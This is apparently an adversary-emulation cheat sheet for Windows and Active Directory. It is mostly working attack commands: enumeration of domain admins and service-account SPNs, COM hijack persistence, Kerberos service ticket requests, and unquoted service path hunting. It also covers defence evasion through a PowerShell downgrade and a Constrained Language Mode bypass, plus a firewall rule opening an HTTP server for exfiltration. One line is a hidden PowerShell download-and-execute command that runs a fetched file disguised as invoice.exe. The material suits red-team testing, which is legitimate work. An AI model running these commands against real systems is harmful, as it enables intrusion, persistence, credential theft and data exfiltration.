# **Adversary Emulation Test**

# **Table Of Contents:**
<!--ts-->
  * [Initial Access](#initial-access)
  * [Host Enumeration](#host-enumeration)
    * [Common Initial Scoping Commands](#common-initial-scoping-commands)
    * [Enumerate Application Control](#enumerate-application-control)
  * [Domain Enumeration](#domain-enumeration)
    * [User Enumeration](#user-enumeration)
      * [All User Accounts with Admin in Name](#all-user-accounts-with-admin-in-name)
      * [Enumerate Domain Admins](#enumerate-domain-admins)
      * [Enumerate Enterprise Admins](#enumerate-enterprise-admins)
      * [Enumerate Schema Admins](#enumerate-schema-admins)
    * [Service Account Enumeration](#service-account-enumeration)
      * [Find All Service Accounts and Their SPNs](#find-all-service-accounts-and-their-spns)
    * [Group Enumeration](#group-enumeration)
    * [Computer Enumeration](#computer-enumeration)
      * [Server Enumeration](#server-enumeration)
      * [Certificate Authority Enumeration](#certificate-authority-enumeration)
    * [GPO Enumeration](#gpo-enumeration)
    * [Organization Unit Enumeration](#organizational-unit-enumeration)
    * [Domain Trust Enumeration](#domain-trust-enumeration)
  * [Execution](#execution)
    * [PowerShell NET Assembly](#powershell-net-assembly)
  * [Persistence](#persistence)
    * [COM Hijacking](#com-hijacking)
    * [DLL Hijacking](#dll-hijacking)
  * [Credentials](#credentials)
    * [Kerberos Tickets](#kerberos-tickets)
      * [Service Accounts](#service-accounts)
  * [Privilege Escalation](#privilege-escalation)
    * [Unquoted Service Path](#unquoted-service-path)
  * [Post Privilege Escalation](#post-privilege-ascalation)
    * [Adding Local User](#adding-local-user)
    * [Adding Defender Exclusion](#adding-defender-exclusion)
  * [Lateral Movement](#lateral-movement)
  * [Exfiltration](#exfiltration)
  * [Misc](#misc)
    * [PowerShell](#powershell)
      * [PowerShell Downgrade](#powershell-downgrade)
      * [Constrained Language Mode](#constrained-language-mode)
      * [AMSI Bypass](#amsi-bypass)
    * [Python](#python)
      * [Check if Python is Installed](#check-if-python-is-installed)
      * [Start HTTP Server for Exfil](#start-http-server-for-exfil)
<!--te-->

# **Host Enumeration**

## **Common Initial Scoping Commands**

### **Current User**

```
# whoami is commonly used to check current user context
whoami

# Can also use this command since whoami might trigger alerts
cmd.exe /c "set u"
```

## **Enumerate Application Control**

### **Check if Application Control is Enforced**

```
# If the *UsermodeCodeIntegrityPolicyEnforcementStatus* value is set to *2* then Application Control is enforced
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

### **Enumerate WDAC Binary Policy File**

```
ls C:\Windows\System32\CodeIntegrity | Select-String -SimpleMatch ".bin.p7b"
```

**NOTE:**

If this file exists attackers might try to exfil this file and use the tool *CIPolicyParser.ps1* to read the actual rules and find allowed executables in the environment

# **Domain Enumeration**

## **User Enumeration**

### **Get All Domain Users**

```
net.exe user /DOMAIN
```

### **All User Accounts with Admin in Name**

```
net.exe user /DOMAIN | Select-String -SimpleMatch "admin"
```

### **Enumerate A Specific Admin User**

```
net.exe user <username> /DOMAIN | FL -Property *
```

## **Group Enumeration**

### **Enumerate All Domain Groups**

```
net.exe groupv /DOMAIN
```

### **Enumerate Groups with *Admin* in Name**

```
net.exe group /DOMAIN | Select-String -SimpleMatch "admin"
```

### **Enumerate Domain Admins**

```
net.exe group "Domain Admins" /DOMAIN | FL -property *
```

### **Enumerate Enterprise Admins**

```
net.exe group "Enterprise Admins" /DOMAIN | FL -property *
```

### **Enumerate Schema Admins**

```
net.exe group "Schema Admins" /DOMAIN | FL -property *
```

## **Service Account Enumeration**

### **Find All Service Acocunts and Their SPNs**

```
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [ADSI]"LDAP://DC=<domain>,DC=<domain>"
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

$searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null

$results = $searcher.FindAll()

foreach ($result in $results)
{
 $account = $result.Properties["samaccountname"]
 $spns = $result.Properties["servicePrincipalName"]
 Write-Host "Account : $($account)"
 foreach ($spn in $spns)
 {
  Write-Host "SPN : $($spn)"
 }
}
```

## **Computer Enumeration**

### **Enumerate Domain Controllers**

```
nltest.exe /dclist:<domain>
```

### **Server Enumeration**

```
# Establish the LDAP filter
$searcher = [ADSISearcher]"(&(objectClass=computer)(operatingsystem=Windows Server*))"

# Execute Search
$searcher.FindAll() | ForEach-Object { $_.Properties.Name }
```

### **Certificate Authority Enumeration**

```
# Using certutil
certutil.exe -config - -ping

# LDAP query

```

## **GPO Enumeration**

### **Find all XML files in GPOs**

```
Get-ChildItem -Path "\\<domain>\SYSVOL\<domain>\Policies" -Recurse -Filter *.xml -ErrorAction SilentlyContinue
```

## **Organization Unit Enumeration**

```
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectCategory=organizationUnit)"
$searcher.SearchRoot = "LDAP://DC=<domain>,DC=<domain>"
$searcher.FindAll() | ForEach-Object { $_.Properties.distinguishedname }
```

## **Domain Trust Enumeration**

### **Find All Trusts**

Method 1

```
nltest.exe /domain_trusts
```

Method 2

```
$domain = System.DirectoryServices.DirectoryEntry("LDAP://CN=System,DC=<domain>,DC=<domain>")

$searcher = System.DirectoryServices.DirectorySearcher($domain)

$searcher.Filter = "(objectClass-trustedDomain)"

$searcher.FindAll() | ForEach-Object { $_.properties["name"] }
```

# **Execution**

## **PowerShell NET Assembly**

### **Execute *calc.exe* Using NET Assembly Method**

```
# No-download method (calc.exe already exists on system)
[System.Diagnostics.Process]::Start("calc.exe")
```

# **Persistence**

## **COM Hijacking**

**NOTE:**

For COM Hijacks you need a DLL to point to to execute. I created a DLL that runs *C:\Windows\System32\calc.exe* which you can use during the test and placed it in this GitHub Repo.

### **Enumerating COM Hijack Opportunities with ProcMon**

![image](https://github.com/user-attachments/assets/3d79926f-0854-4130-9dfb-47416b5248d3)


### **Enumerating Scheduled Tasks That Call COM Objects**

```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

### **Creating New InprocServer32 Registry Key/Value Pair**

```
# Create New CLSID Registry Key in HKCU where it was not defined
New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "{<CLISD-ID>}"

# Set the InprocServer32 Key to point to your DLL
New-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}" -Name "InprocServer32" -Value "<Path-To-DLL>"

# Set threading to where this DLL gets executed on any COM object calls for this CLSID
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32" -Name "ThreadingModel" -Value "Both"

# Valid COM Object Registry properly set
Get-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32"

# Clean Up
Remove-Item "HKCU:\Software\Classes\CLSID\{<CLSID-ID>}" -Recurse
```

### **Common COM Objects to Target**

```
# TODO
```

# **Credentials**

## **Kerberos Tickets**

### **Service Acounts**

**NOTE:**

Before doing this step you will want to enumerate for service acocunts in the domain which can be found in the *Domain Enumeration* section

**Request Ticket of a Service Acocunt**

```
# Validate there is not Kerberos ticket on device before execution
klist

# Add NET Type
Add-Type -AssemblyName System.IdentityModel

# Request Service Account Ticket
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"

# Validate Ticket is now on device
klist

# Clean-Up
klist purge
```

# **Privilege Escalation**

## **Unquoted Service Path**

### **Enumeration of Unquoted Service Paths**

```
# Get all Serices
$services = Get-WmiObject -Class Win32_Service | Select-Object Name, PathName

# Pull out the service executable paths
$paths = $services.PathName

# Get Paths with Spaces
$vulnerable_paths = @()

foreach ($path in $paths)
{
    $executable = "$($($path -split '\.exe')[0])" + ".exe"
    if ($executable -contains " " -and -not $executable -contains "`"")
    {
        $vulnerable_paths += $executable
    } 
}

$vulnerable_paths
```

# **Misc**

## **Defender For Endpoint Test Detection**

```
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
```

## **PowerShell**

### **PowerShell Downgrade**

```
# Test command before downgrade
echo "Mimikatz"

# Downgrade PowerShell to Version 2 which has less protections
powershell -version 2

# Test command after downgrade
echo "Mimikatz"
```

### **Constrained Language Mode**

#### **Detecting Constrained Language Mode**

```
$ExecutionContext.SessionState.LanguageMode
```

### **Circumvent Constrained Language Mode**

You can try the PowerShell downgrade attack mentioned above which should get you into a session with FullLanguage Mode

#### **System32 Bypass**

Create *test.ps1*

```
# Contents of test.ps1
$ExecutionContext.SessionState.LanguageMode
```

Run the following command:

```
# There is a bypass where if the string *System32* is in the path of the script it will gain FullLanguag Mode

.\test.ps1; mv .\test.ps1 system32.ps1; .\system32.ps1
```

## **Python**

### **Check If Python is Installed**

```
python --version
```

If python exists you can continue this path...

### **Start HTTP Server for Exfil**

```
# Start Simple HTTP Server
python -m http.server 4444

# If blocked by FireWall Rules create new Firewall Rule to allow inbound traffic on port 4444
# NOTE: You will need Administrative powershell session
New-NetFirewallRule -Name "Python Test- Delete" -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow -Profile Any

# Clean-Up FireWall Rule
Remove-NetFirewallRule -DisplayName "<displayName>"
```
